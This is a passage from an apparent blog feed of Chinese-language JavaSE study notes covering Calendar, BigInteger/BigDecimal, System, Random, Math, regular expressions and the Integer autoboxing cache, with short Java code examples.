field)<blockquote><p>返回指定日历字段的值，日历字段代表年月日那些，比如1那么就表示年，不过为了方便，Calendar给出了<code>字段常量</code>，比如Calendar.YEAR常量它的值是1，代表了年。</p></blockquote></li><li>.add(int field,int i1)    <blockquote><p>指定字段的值加减，当前年为2018</p><p>例当前年为2018：add(Calendar.YEAR，-1)<br>那么返回2017</p></blockquote></li><li>.set(int year,int month,int day)<blockquote><p>修改指定字段,可以直接修改年月日，也可以像add那样修改年等。</p></blockquote></li></ul><h3 id="代码示例："><a href="#代码示例：" class="headerlink" title="代码示例："></a>代码示例：</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取今天年月日和星期</span></span><br><span class="line"><span class="type">Calendar</span> <span class="built_in">c</span> = <span class="type">Calendar</span>.getInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取一个日历</span></span><br><span class="line"><span class="type">System</span>.out.<span class="built_in">println</span>(<span class="built_in">c</span>.<span class="keyword">get</span>(<span class="type">Calendar</span>.<span class="type">YEAR</span>) + <span class="string">"年"</span> + <span class="built_in">c</span>.<span class="keyword">get</span>(<span class="type">Calendar</span>.<span class="type">MONTH</span>) + <span class="number">1</span> + <span class="string">"月"</span> </span><br><span class="line">+ <span class="built_in">c</span>.<span class="keyword">get</span>(<span class="type">Calendar</span>.<span class="type">DAY_OF_MONTH</span>) + <span class="string">"日\n星期"</span> + (<span class="built_in">c</span>.<span class="keyword">get</span>(<span class="type">Calendar</span>.<span class="type">DAY_OF_WEEK</span>) - <span class="number">1</span>));</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Date的概述&quot;&gt;&lt;a href=&quot;#Date的概述&quot; class=&quot;headerlink&quot; title=&quot;Date的概述&quot;&gt;&lt;/a&gt;Date的概述&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;获取瞬间时间，精确到毫秒。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;例子：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight gauss&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;Date&lt;/span&gt; d = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;Date&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//打印d会显示打印时瞬间的电脑系统时间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;Date&lt;/span&gt; d = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;Date&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//这样会打印1970年1月1日的8点&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="Date类" scheme="http://liuhaoan.github.io/tags/Date%E7%B1%BB/"/>
    
      <category term="SimpDateFormat类" scheme="http://liuhaoan.github.io/tags/SimpDateFormat%E7%B1%BB/"/>
    
      <category term="Calendar类" scheme="http://liuhaoan.github.io/tags/Calendar%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——BigInteger与BigDecimal类</title>
    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94BigInteger%E4%B8%8EBigDecimal%E7%B1%BB/"/>
    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——BigInteger与BigDecimal类/</id>
    <published>2019-04-09T12:34:20.000Z</published>
    <updated>2019-04-09T12:40:18.041Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BigInteger的概述"><a href="#BigInteger的概述" class="headerlink" title="BigInteger的概述"></a>BigInteger的概述</h1><blockquote><p><code>不可变</code>的任意精度的整数。所有操作中，都以<code>二进制补码</code>形式表示 BigInteger（如 Java 的基本整数类型）。</p><p>BigInteger 提供所有 Java 的<code>基本整数操作符</code>的对应物，并提供 java.lang.Math 的<code>所有相关方法</code>。</p><p>另外，BigInteger 还提供以下运算：<br>模算术、GCD 计算、质数测试、素数生成、位操作以及一些其他操作。 </p></blockquote><a id="more"></a><p>ps：了解一下BigInteger类可以存下任意长度的数值就行了。</p><h4 id="与BigInteger不同的是，BigDecimal是小数"><a href="#与BigInteger不同的是，BigDecimal是小数" class="headerlink" title="与BigInteger不同的是，BigDecimal是小数"></a>与BigInteger不同的是，BigDecimal是小数</h4><p>####注意事项：</p><blockquote><p>开发中创建BigDecimal对象进行运算时，给它有参构造传入的值要以字符串形式传入，如果以<code>数值形式</code>传入的话会<code>损失精度</code>。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;BigInteger的概述&quot;&gt;&lt;a href=&quot;#BigInteger的概述&quot; class=&quot;headerlink&quot; title=&quot;BigInteger的概述&quot;&gt;&lt;/a&gt;BigInteger的概述&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;不可变&lt;/code&gt;的任意精度的整数。所有操作中，都以&lt;code&gt;二进制补码&lt;/code&gt;形式表示 BigInteger（如 Java 的基本整数类型）。&lt;/p&gt;
&lt;p&gt;BigInteger 提供所有 Java 的&lt;code&gt;基本整数操作符&lt;/code&gt;的对应物，并提供 java.lang.Math 的&lt;code&gt;所有相关方法&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;另外，BigInteger 还提供以下运算：&lt;br&gt;模算术、GCD 计算、质数测试、素数生成、位操作以及一些其他操作。 &lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="BigInteger类" scheme="http://liuhaoan.github.io/tags/BigInteger%E7%B1%BB/"/>
    
      <category term="BigDecimal类" scheme="http://liuhaoan.github.io/tags/BigDecimal%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——System类</title>
    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94System%E7%B1%BB/"/>
    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——System类/</id>
    <published>2019-04-09T12:23:18.000Z</published>
    <updated>2019-04-09T12:31:36.029Z</updated>
    
    <content type="html"><![CDATA[<h1 id="System类的概述"><a href="#System类的概述" class="headerlink" title="System类的概述"></a>System类的概述</h1><blockquote><p>System类有<code>标准输入</code>、<code>标准输出</code>和<code>错误输出</code>流；</p><p>对外部定义的属性和环境变量的访问；加载文件和库的方法；</p><p>还有快速复制数组的一部分的实用方法。</p></blockquote><a id="more"></a><h1 id="字段："><a href="#字段：" class="headerlink" title="字段："></a>字段：</h1><blockquote><p>err<br>标准错误流</p><p>in<br>标准输入流</p><p>out<br>标准输出流</p></blockquote><h1 id="System类的方法"><a href="#System类的方法" class="headerlink" title="System类的方法"></a>System类的方法</h1><ul><li>.gc()<blockquote><p>运行垃圾收集器，虽然objcket类中有一个<code>filalize</code>的方法会自动清理垃圾，但是垃圾没有<code>超过一个量</code>是不会自动收集的。</p></blockquote></li><li>.exit()<blockquote><p>退出java虚拟机jvm，传入值为0是正常终止，非0为异常终止。</p></blockquote></li><li>.currentTimeMillis()<blockquote><p>返回当前时间与协调世界时 <code>1970 年 1 月 1 日午夜</code>之间的时间差（以毫秒为单位测量）。</p><p>ps：经常应用在<code>计算程序运行时间</code>，从程序开始记录一次，结束记录一次，然后减去即可。</p></blockquote></li></ul><ul><li>.arraycopy(Object src, int srcPos, Object dest, int destPos, int length) <blockquote><p>从指定源数组中复制一个数组，复制从指定的位置开始，到目标数组的指定位置结束。</p><p>参数：<br>src - 源数组。<br>srcPos - 源数组中的起始位置。<br>dest - 目标数组。<br>destPos - 目标数据中的起始位置。<br>length - 要复制的数组元素的数量。</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;System类的概述&quot;&gt;&lt;a href=&quot;#System类的概述&quot; class=&quot;headerlink&quot; title=&quot;System类的概述&quot;&gt;&lt;/a&gt;System类的概述&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;System类有&lt;code&gt;标准输入&lt;/code&gt;、&lt;code&gt;标准输出&lt;/code&gt;和&lt;code&gt;错误输出&lt;/code&gt;流；&lt;/p&gt;
&lt;p&gt;对外部定义的属性和环境变量的访问；加载文件和库的方法；&lt;/p&gt;
&lt;p&gt;还有快速复制数组的一部分的实用方法。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="System类" scheme="http://liuhaoan.github.io/tags/System%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——Random类</title>
    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Random%E7%B1%BB/"/>
    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——Random类/</id>
    <published>2019-04-09T12:21:11.000Z</published>
    <updated>2019-04-09T12:22:36.527Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Random概述"><a href="#Random概述" class="headerlink" title="Random概述"></a>Random概述</h1><ul><li>利用传入的随机数种子，生成一个伪随机数</li></ul><h1 id="Random类的方法"><a href="#Random类的方法" class="headerlink" title="Random类的方法"></a>Random类的方法</h1><ul><li>.nextInt(Int i);<blockquote><p>生成一个从0到i的随机数，包括0不包括i</p></blockquote></li></ul><h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Random r = <span class="keyword">new</span> <span class="type">Random</span>();</span><br><span class="line"><span class="comment">//不输入种子的话系统自动使用纳秒来当作种子</span></span><br><span class="line"></span><br><span class="line">r.nextInt(<span class="number">100</span>);</span><br><span class="line"><span class="comment">//生成了0到100的随机数，不包括100</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ps：如果要生成1-100的随机数，直接+1</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Random概述&quot;&gt;&lt;a href=&quot;#Random概述&quot; class=&quot;headerlink&quot; title=&quot;Random概述&quot;&gt;&lt;/a&gt;Random概述&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;利用传入的随机数种子，生成一个伪随机数&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;R
      
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="Random类" scheme="http://liuhaoan.github.io/tags/Random%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——Math数学类的使用</title>
    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Math%E6%95%B0%E5%AD%A6%E7%B1%BB%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——Math数学类的使用/</id>
    <published>2019-04-09T12:17:11.000Z</published>
    <updated>2019-04-09T12:20:16.752Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Math类的方法"><a href="#Math类的方法" class="headerlink" title="Math类的方法"></a>Math类的方法</h1><ul><li>int abs(int a)<blockquote><p>取绝对值</p></blockquote></li></ul><ul><li>double ceil(double a)    <blockquote><p>向上取整数返回double，例子：输入12.56输出一个13.0</p></blockquote></li></ul><ul><li>double floor(double a)<blockquote><p>与上同理，但是向下取整数</p></blockquote></li></ul><a id="more"></a><ul><li>int max(int a,int b) min自学<blockquote><p>取大的值</p></blockquote></li></ul><ul><li>double pow(double a,double b)    <blockquote><p>a是底数，b是指数</p></blockquote></li></ul><ul><li>double random()<blockquote><p>生成0.0到1.0之间的随机小数，包括0.0不包括1.0</p></blockquote></li></ul><ul><li>int round(float a) 参数为double的自学<blockquote><p>四舍五入</p></blockquote></li></ul><ul><li>double sqrt(double a)    <blockquote><p>开平方 输入4返回2.0 输入9返回3</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Math类的方法&quot;&gt;&lt;a href=&quot;#Math类的方法&quot; class=&quot;headerlink&quot; title=&quot;Math类的方法&quot;&gt;&lt;/a&gt;Math类的方法&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;int abs(int a)&lt;blockquote&gt;
&lt;p&gt;取绝对值&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;double ceil(double a)    &lt;blockquote&gt;
&lt;p&gt;向上取整数返回double，例子：输入12.56输出一个13.0&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;double floor(double a)&lt;blockquote&gt;
&lt;p&gt;与上同理，但是向下取整数&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="Math类" scheme="http://liuhaoan.github.io/tags/Math%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——正则表达式</title>
    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——正则表达式/</id>
    <published>2019-04-09T11:58:39.000Z</published>
    <updated>2019-04-09T12:16:00.153Z</updated>
    
    <content type="html"><![CDATA[<h1 id="正则表达式概念"><a href="#正则表达式概念" class="headerlink" title="正则表达式概念"></a>正则表达式概念</h1><blockquote><p>就是一种规则，可以在某一段字符串中以某一个特殊的规则，取到自己想要的那段字符串。</p></blockquote><a id="more"></a><h1 id="String中的正则表达式方法："><a href="#String中的正则表达式方法：" class="headerlink" title="String中的正则表达式方法："></a>String中的正则表达式方法：</h1><ul><li><p>.matches()    </p><blockquote><p>是否匹配这个正则表达式，返回true或者false</p></blockquote></li><li><p>.replaceAll(String regex,String xxx)</p><blockquote><p>替换所有匹配到的字符串</p><p>ps：使用正则非常好用，例：regex的内容为\d 那么那个字符串的所有数字都会被替换</p></blockquote></li></ul><ul><li>.replaceFirst(String regex,String xxx)<blockquote><p>替换找到的第一个字符串</p></blockquote></li><li>.split()<blockquote><p>以某一个字符串切割字符串</p></blockquote></li></ul><h1 id="正则表达式专属类与方法"><a href="#正则表达式专属类与方法" class="headerlink" title="正则表达式专属类与方法"></a>正则表达式专属类与方法</h1><h4 id="实现方法："><a href="#实现方法：" class="headerlink" title="实现方法："></a>实现方法：</h4><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Pattern</span> p = <span class="built_in">Pattern</span>.compile(<span class="string">"a*b"</span>);</span><br><span class="line"><span class="comment">//把正则表达式编译到模式中</span></span><br><span class="line"></span><br><span class="line">Matcher m = p.matcher(<span class="string">"aaaaab"</span>);</span><br><span class="line"><span class="comment">//使用上面创建的对象来匹配一个字符串</span></span><br><span class="line"></span><br><span class="line">boolean b = m.matches();</span><br><span class="line"><span class="comment">//全部匹配到了则返回true</span></span><br></pre></td></tr></table></figure><h4 id="实战例子："><a href="#实战例子：" class="headerlink" title="实战例子："></a>实战例子：</h4><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">String str1 = <span class="string">"我手机号码是18734126341，曾经用过17707053381，曾经还用过13228865165"</span>;</span><br><span class="line"></span><br><span class="line">Pattern p = Pattern.<span class="keyword">compile</span>(<span class="string">"1[356789]\\d&#123;9&#125;"</span>);</span><br><span class="line"><span class="comment">//把正则表达式编译到模式中</span></span><br><span class="line"></span><br><span class="line">Matcher m = p.matcher(str1);</span><br><span class="line"><span class="comment">//创建一个匹配器</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(m.<span class="keyword">find</span>())</span><br><span class="line"><span class="comment">//匹配下一个能成功匹配的字符串，成功返回true</span></span><br><span class="line"></span><br><span class="line">System.out.<span class="keyword">println</span>(m.<span class="keyword">group</span>());</span><br><span class="line"><span class="comment">//返回上一个匹配到的字符串</span></span><br></pre></td></tr></table></figure><h4 id="正则表达式字符类"><a href="#正则表达式字符类" class="headerlink" title="正则表达式字符类"></a>正则表达式<code>字符类</code></h4><table><thead><tr><th>表达式</th><th>获取结果</th></tr></thead><tbody><tr><td>[abc]</td><td>a、b 或 c（简单类） </td></tr><tr><td>[^abc]</td><td>任何字符，除了 a、b 或 c（否定） </td></tr><tr><td>[a-zA-Z]</td><td>a 到 z 或 A 到 Z，两头的字母包括在内（范围） </td></tr><tr><td>[a-d[m-p]]</td><td>a 到 d 或 m 到 p：[a-dm-p]（并集） </td></tr><tr><td>[a-z&amp;&amp;[def]]</td><td>d、e 或 f（交集） </td></tr><tr><td>[a-z&amp;&amp;[^bc]]</td><td>a 到 z，除了 b 和 c：[ad-z]（减去） </td></tr><tr><td>[a-z&amp;&amp;[^m-p]]</td><td>a 到 z，而非 m 到 p：[a-lq-z]（减去） </td></tr></tbody></table><h4 id="正则表达式预定义字符类"><a href="#正则表达式预定义字符类" class="headerlink" title="正则表达式预定义字符类"></a>正则表达式<code>预定义字符类</code></h4><table><thead><tr><th>表达式</th><th>获取结果</th></tr></thead><tbody><tr><td>.</td><td>任何字符（与行结束符可能匹配也可能不匹配） </td></tr><tr><td>\d</td><td>数字：[0-9] </td></tr><tr><td>\D</td><td>非数字： [^0-9] </td></tr><tr><td>\s</td><td>空白字符：[ \t\n\x0B\f\r] </td></tr><tr><td>\S</td><td>非空白字符：[^\s] </td></tr><tr><td>\w</td><td>单词字符：[a-zA-Z_0-9] </td></tr><tr><td>\W</td><td>非单词字符：[^\w] </td></tr></tbody></table><h4 id="正则表达式Greedy-数量词"><a href="#正则表达式Greedy-数量词" class="headerlink" title="正则表达式Greedy 数量词"></a>正则表达式Greedy <code>数量词</code></h4><table><thead><tr><th>表达式</th><th>获取结果</th></tr></thead><tbody><tr><td>X?</td><td>X，一次或一次也没有 </td></tr><tr><td>X*</td><td>X，零次或多次 </td></tr><tr><td>X+</td><td>X，一次或多次 </td></tr><tr><td>X{n}</td><td>X，恰好 n 次 </td></tr><tr><td>X{n,}</td><td>X，至少 n 次 </td></tr><tr><td>X{n,m}</td><td>X，至少 n 次，但是不超过 m 次 </td></tr></tbody></table><h4 id="正则表达式的分组功能"><a href="#正则表达式的分组功能" class="headerlink" title="正则表达式的分组功能"></a>正则表达式的分组功能</h4><blockquote><p>1、使用（）进行分组</p><p>例子：(.)\1(.)\2</p><p>代表：第一组再出现一次，第二组也再出现一次，也就是\1同等与上一组出现的数据</p><p>例子：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str1 = “高高兴兴”</span><br><span class="line">str1.matches(<span class="string">"(.)<span class="subst">\\</span>1(.)<span class="subst">\\</span>2"</span>)</span><br><span class="line"><span class="comment">//返回true</span></span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>2、$符号，在替换时可以获取到正则表达式中某组获取到的字符，$1代表获取到第一组中的字符串</p><p>例子：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"问问啊啊"</span>.replaceAll(<span class="string">"(.)\\1"</span>,<span class="string">"$1"</span>);</span><br><span class="line"><span class="regexp">//</span>替换后的结果为：问啊<span class="variable">$1</span></span><br></pre></td></tr></table></figure></p></blockquote><p>获取到了(.)的值</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;正则表达式概念&quot;&gt;&lt;a href=&quot;#正则表达式概念&quot; class=&quot;headerlink&quot; title=&quot;正则表达式概念&quot;&gt;&lt;/a&gt;正则表达式概念&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;就是一种规则，可以在某一段字符串中以某一个特殊的规则，取到自己想要的那段字符串。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="正则表达式" scheme="http://liuhaoan.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——Integer中的常见面试题</title>
    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Integer%E4%B8%AD%E7%9A%84%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——Integer中的常见面试题/</id>
    <published>2019-04-09T09:16:38.000Z</published>
    <updated>2019-04-09T09:22:44.443Z</updated>
    
    <content type="html"><![CDATA[<h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><a id="more"></a><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">package com.heima.wrapclass;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Demo5_Integer</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param args</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(<span class="params">String[] args</span>)</span> &#123;</span><br><span class="line">Integer i1 = <span class="keyword">new</span> Integer(<span class="number">97</span>);</span><br><span class="line">Integer i2 = <span class="keyword">new</span> Integer(<span class="number">97</span>);</span><br><span class="line">System.<span class="keyword">out</span>.println(i1 == i2);</span><br><span class="line"><span class="comment">//false</span></span><br><span class="line"></span><br><span class="line">System.<span class="keyword">out</span>.println(i1.<span class="keyword">equals</span>(i2));</span><br><span class="line"><span class="comment">//true</span></span><br><span class="line">System.<span class="keyword">out</span>.println(<span class="string">"-----------"</span>);</span><br><span class="line"></span><br><span class="line">Integer i3 = <span class="keyword">new</span> Integer(<span class="number">197</span>);</span><br><span class="line">Integer i4 = <span class="keyword">new</span> Integer(<span class="number">197</span>);</span><br><span class="line">System.<span class="keyword">out</span>.println(i3 == i4);</span><br><span class="line"><span class="comment">//false</span></span><br><span class="line"></span><br><span class="line">System.<span class="keyword">out</span>.println(i3.<span class="keyword">equals</span>(i4));</span><br><span class="line"><span class="comment">//true</span></span><br><span class="line">System.<span class="keyword">out</span>.println(<span class="string">"-----------"</span>);</span><br><span class="line"></span><br><span class="line">Integer i5 = <span class="number">127</span>;</span><br><span class="line">Integer i6 = <span class="number">127</span>;</span><br><span class="line">System.<span class="keyword">out</span>.println(i5 == i6);</span><br><span class="line"><span class="comment">//true</span></span><br><span class="line"></span><br><span class="line">System.<span class="keyword">out</span>.println(i5.<span class="keyword">equals</span>(i6));</span><br><span class="line"><span class="comment">//true</span></span><br><span class="line">System.<span class="keyword">out</span>.println(<span class="string">"-----------"</span>);</span><br><span class="line"></span><br><span class="line">Integer i7 = <span class="number">128</span>;</span><br><span class="line">Integer i8 = <span class="number">128</span>;</span><br><span class="line">System.<span class="keyword">out</span>.println(i7 == i8);</span><br><span class="line">System.<span class="keyword">out</span>.println(i7.<span class="keyword">equals</span>(i8));</span><br><span class="line"><span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * -128到127是byte的取值范围,如果在这个取值范围内,自动装箱就不会新创建对象,而是从常量池中获取</span></span><br><span class="line"><span class="comment"> * 如果超过了byte取值范围就会再新创建对象</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * public static Integer valueOf(int i) &#123;</span></span><br><span class="line"><span class="comment">        assert IntegerCache.high &gt;= 127;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">//i&gt;= -128 &amp;&amp; i &lt;= 127</span></span><br><span class="line"><span class="comment">        if (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high)</span></span><br><span class="line"><span class="comment">            return IntegerCache.cache[i + (-IntegerCache.low)];</span></span><br><span class="line"><span class="comment">        return new Integer(i);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul><li>底层代码可以理解成一个数组，这个数组索引0对应着-128、255对应着127，当传入的值在-128 - 127之间时自动装箱时会直接在这个<code>数组中取值</code>，进而<code>引用地址是一样的</code>，所以上面返回了true</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;代码示例&quot;&gt;&lt;a href=&quot;#代码示例&quot; class=&quot;headerlink&quot; title=&quot;代码示例&quot;&gt;&lt;/a&gt;代码示例&lt;/h1&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="Integer" scheme="http://liuhaoan.github.io/tags/Integer/"/>
    
      <category term="Integer面试题" scheme="http://liuhaoan.github.io/tags/Integer%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    
      <category term="面试题" scheme="http://liuhaoan.github.io/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——JDK5新特性之_自动拆箱与装箱</title>
